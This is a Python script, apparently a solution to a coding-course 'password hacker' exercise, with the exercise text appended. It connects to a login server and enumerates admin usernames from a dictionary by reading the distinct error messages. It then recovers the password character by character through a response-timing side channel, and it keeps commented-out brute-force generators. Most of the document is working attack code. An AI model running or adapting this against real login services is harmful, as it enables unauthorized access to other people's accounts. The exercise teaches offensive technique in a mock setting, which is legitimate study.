import socket, string, sys, itertools, json, datetime

def brute_force_gen():
    """yields combinations of passwords based on latin letters and numbers"""
    chars = string.ascii_letters + string.digits
    tries = 1
    length = 1
    while True:
        for key in itertools.combinations_with_replacement(chars, length):
            yield ''.join(key)
            tries += 1
        length += 1


def logins_gen():
    """returns a password generator object from dictionary text-file"""
    with open("./password-hacker_logins.txt", 'r') as file:
        passwords = file.read().split()
    for password in passwords:
        yield password


def passes_gen():
    """returns a password generator object from dictionary text-file"""
    with open("./password-hacker_passwords.txt", 'r') as file:
        passwords = file.read().split()
    for word in (password for password in passwords):
        for pwrd in map(''.join, itertools.product(*zip(word.upper(), word.lower()))):
            yield pwrd


def to_json(username, password, indentation=None):
    """takes two strings, turns them to dict then to json format"""
    dct = {"login": username, "password": password}
    return json.dumps(dct, indent=indentation)


# input target host:port from terminal
script, host, port = sys.argv
port = int(port)
buffer = 1024

# establish connection
with socket.socket() as client:
    client.connect((host, port))
    #for letter in brute_force_gen():  # use this to brute-force username
    for usr in logins_gen():  # first try usernames with empty pass
        client.send(to_json(usr, ' ', 4).encode())
        reply = json.loads(client.recv(buffer).decode())
        admin = usr
        if reply["result"] == "Wrong password!":  # knowing server vulnerability No1
            break

    psswrd = ''
    hacking = True
    while hacking:  # keep admin's username and try for password
        letter_gen = (letter for letter in (string.ascii_letters + string.digits))
        #for letter in brute_force_gen():  # use this to brute-force password
        for letter in letter_gen:
            before_reply = datetime.datetime.now()
            client.send(to_json(admin, psswrd + letter, 4).encode())
            reply = client.recv(buffer)
            after_reply = datetime.datetime.now()
            response = float(str(after_reply - before_reply).split(':')[-1])
            # create log for server response time, using datetime
            with open("./timing.txt", "a") as log:
                log.write(f'{response}, {psswrd}\n\n')
            reply = json.loads(reply.decode())
            if response >= 0.07:  # time chosen after analyzing server's responses (timing.txt)
                psswrd += letter
                break
            elif reply["result"] == "Connection success!":  # knowing server vulnerability No2
                hacking = False
                psswrd += letter
                print(to_json(admin, psswrd))
                break


'''
TASK:

The server is becoming smarter along with your hacking program. Now the admin has implemented a security system by login and password. In order to access the site with admin privileges, you need to know the admin's login and password. Fortunately, we have a dictionary of different logins and a very interesting vulnerability. You need to improve your program once again to hack the new system.
Also, now the admin has made a complex password that is guaranteed to be absent in the databases since it's randomly generated from several characters.
The server now uses JSON to send messages.
First of all, you should adjust your program so that it can send the combination of login and password in JSON format to the server.
Use the dictionary of typical admin logins. Since you don’t know the login, you should try different variants from the dictionary as you did at the previous stage with the passwords. You will know that the login is correct when you get the ‘wrong password’ result instead of ‘wrong login’. As for passwords, they’ve become yet harder, so a simple dictionary is no longer enough. Fortunately, a vulnerability has been found: the ‘exception’ message pops up when the symbols you tried for the password match the beginning of the correct one.

In case of the wrong password, the response you receive looks like this:
{"result": "Wrong login!"}

If you got the login right but failed to find the password, you get this:
{"result": "Wrong password!"}

If some exception happens, you'll see this result:
{"result": "Exception happened during login"}

When you finally succeed in finding both the login and the password, you'll see the following:
{"result": "Connection success!"}

===========

Your program has successfully hacked the new system! However, you've been spotted: the admin noticed your first failed attempts, found the vulnerability and made a patch. You should overcome this patch and hack the system again. It’s not easy being a hacker!
The admin has improved the server: the program now catches the exception and sends a simple ‘wrong password’ message to the client even when the real password starts with current symbols.
But here's the thing: the admin probably just caught this exception. We know that catching an exception takes the computer a long time, so there should be a delay in the server response when this exception takes place. You can use it to hack the system: count the time period in which the response comes and find out which starting symbols work out for the password.
'''